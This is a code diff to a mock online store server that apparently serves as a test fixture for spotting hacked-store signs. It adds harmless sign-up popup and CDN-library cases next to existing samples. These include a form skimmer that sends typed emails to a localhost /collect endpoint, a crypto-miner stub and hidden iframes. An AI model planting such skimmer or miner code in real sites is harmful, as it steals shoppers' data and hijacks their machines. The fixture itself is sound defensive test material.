@@ -59,7 +59,12 @@ const US = EXTRA.split(',').includes('us'); // US privacy: the "Your privacy cho
 // FORM_EXTRAS: both add an email sign-up box to every page, read by the store's own script (never reported).
 //   skimmer     an outside script (127.0.0.1) that listens to the email box and sends what was typed to /collect
 //   formreader  an outside script (127.0.0.1) that reads the email box but sends nothing (like a chat widget)
-const FORM_EXTRAS = ['skimmer', 'formreader'];
+//   cdnlib      the store's own inline code reads the email box through a small library from lib-cdn.localhost
+//               (like jQuery from a public CDN; list that host in FORM_LIBRARY_CDNS)
+//   popup       an email sign-up popup from svc.localhost listens to the email box (like Klaviyo; list that
+//               host in FORM_SERVICES): it records whatever is typed at GET /__popup
+const FORM_EXTRAS = ['skimmer', 'formreader', 'cdnlib', 'popup'];
+const POPUP = []; // what the sign-up popup captured
 // HIJACK (security S2), the signs of a hacked store:
 //   redirect       the home page sends every visitor to a scam site (prize-win.localhost) after a moment
 //   phoneredirect  the same, but only for phone shoppers arriving from Google (what real infections do)
@@ -84,7 +89,9 @@ const scriptTags = () => (LIVE_EXTRA.has('newscript') ? `<script src="http://127
   + (LIVE_EXTRA.has('badscript') ? `<script src="http://evil-cdn.localhost:${PORT}/lib/m.js"></script>` : '')
   + (LIVE_EXTRA.has('apps') ? `<script src="http://reviews-app.localhost:${PORT}/apps/reviews.js?shop=mock"></script>` : '')
   + (LIVE_EXTRA.has('apps') && LIVE_EXTRA.has('appsupdate') ? `<script src="http://reviews-app.localhost:${PORT}/apps/reviews-photos.js"></script>` : '')
-  + (LIVE_EXTRA.has('apps') && REQ_PATH === '/' ? `<script src="http://chat-app.localhost:${PORT}/apps/chat.js" async></script>` : '');
+  + (LIVE_EXTRA.has('apps') && REQ_PATH === '/' ? `<script src="http://chat-app.localhost:${PORT}/apps/chat.js" async></script>` : '')
+  + (LIVE_EXTRA.has('cdnlib') ? `<script src="http://lib-cdn.localhost:${PORT}/libs/minq.js"></script><script>document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;minq(i).on('input',function(){window.__q=minq(i).val();});window.__q0=minq(i).val();});</script>` : '')
+  + (LIVE_EXTRA.has('popup') ? `<script src="http://svc.localhost:${PORT}/apps/popup.js"></script>` : '');
 const frameTags = () => (/^\/(products\/|cart$)/.test(PATH) ? (LIVE_EXTRA.has('hiddenframe') ? `<iframe src="http://stat-counter.localhost:${PORT}/f.html?id=7" width="1" height="1" style="position:absolute;left:-3000px;border:0"></iframe>` : '')
   + (LIVE_EXTRA.has('badframe') ? `<iframe src="http://evil-cdn.localhost:${PORT}/f.html" style="display:none"></iframe>` : '') : '');
 const MINER_JS = "window.CoinHive={Anonymous:function(k,o){this.start=function(){try{new WebSocket('ws://pool.minexmr.localhost:" + PORT + "/proxy');}catch(e){}};}};var miner=new CoinHive.Anonymous('SITE_KEY',{throttle:0.3});miner.start();";
@@ -95,6 +102,10 @@ const FORM_JS = {
   '/apps/pixel-helper.js': `(function(){function grab(e){var v=e.target.value;if(!v)return;new Image().src='http://127.0.0.1:${PORT}/collect?e='+encodeURIComponent(v);fetch('http://127.0.0.1:${PORT}/collect',{method:'POST',mode:'no-cors',body:JSON.stringify({d:btoa(v)})});}
 document.addEventListener('DOMContentLoaded',function(){document.querySelectorAll('input[type=email]').forEach(function(i){i.addEventListener('change',grab);});});})();`,
   // A chat widget that pre-fills its own form from the sign-up box: reads it, sends nothing.
+  // A tiny DOM library, served as if from a public CDN.
+  '/libs/minq.js': 'window.minq=function(el){return{on:function(t,f){el.addEventListener(t,f);},val:function(){return el.value;}};};',
+  // An email sign-up popup: turns whatever is typed into the box into a contact.
+  '/apps/popup.js': `document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('change',function(){if(i.value)fetch('http://svc.localhost:${PORT}/__popup',{method:'POST',mode:'no-cors',body:i.value});});});`,
   '/apps/chat-widget.js': "document.addEventListener('DOMContentLoaded',function(){var i=document.getElementById('NewsletterEmail');if(!i)return;i.addEventListener('input',function(){window.__chatEmail=i.value;});});",
 };
 const APP_SCRIPTS = {
@@ -211,6 +222,10 @@ const server = http.createServer(async (req, res) => {
     COLLECTED.push({ method: req.method, query: u.search, body });
     res.writeHead(204, { 'Access-Control-Allow-Origin': '*' });
     return res.end();
+  }
+  if (p === '/__popup') {
+    if (req.method === 'POST') { POPUP.push(await readBody(req)); res.writeHead(204, { 'Access-Control-Allow-Origin': '*' }); return res.end(); }
+    return send(res, 200, { captured: POPUP }, 'application/json');
   }
   if (p === '/__collected') return send(res, 200, { collected: COLLECTED }, 'application/json');
   if (FORM_JS[p]) return send(res, 200, FORM_JS[p], 'application/javascript');
